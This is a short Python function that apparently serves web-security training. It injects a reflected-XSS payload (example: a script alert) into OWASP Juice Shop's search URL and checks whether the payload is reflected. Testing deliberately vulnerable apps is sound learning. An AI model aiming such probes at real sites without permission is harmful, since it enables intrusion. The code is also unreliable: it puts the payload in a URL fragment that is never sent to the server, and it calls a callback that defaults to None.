import requests
import urllib.parse

def simulate_reflected_xss(base_url, xss_payload, callback=None):
    """
    :param base_url: L'URL de base de l'application Juice Shop
                     (ex. http://localhost:3000).
    :param xss_payload: Le script/morceau de code malveillant à injecter
                        (ex. <script>alert('XSS')</script>).
    :return: True si le payload XSS est repéré dans la réponse, sinon False.
    """
    encoded_payload = urllib.parse.quote(xss_payload)
    xss_url = f"{base_url}/#/search?q={encoded_payload}"
    callback(xss_url)
    try:
        response = requests.get(xss_url, headers={"Accept-Encoding": "identity"})


        callback(f"Request status: {response.status_code}")
        callback(f"Response:\n{response.text}")

        if xss_payload in response.text:
            callback("[+] XSS Payload found in the response. Potential Reflected XSS!")
            return True
        else:
            callback("[-] Payload not reflected in the response.")
            return False

    except requests.RequestException as e:
        callback(f"[!] Request error: {e}")
        return False
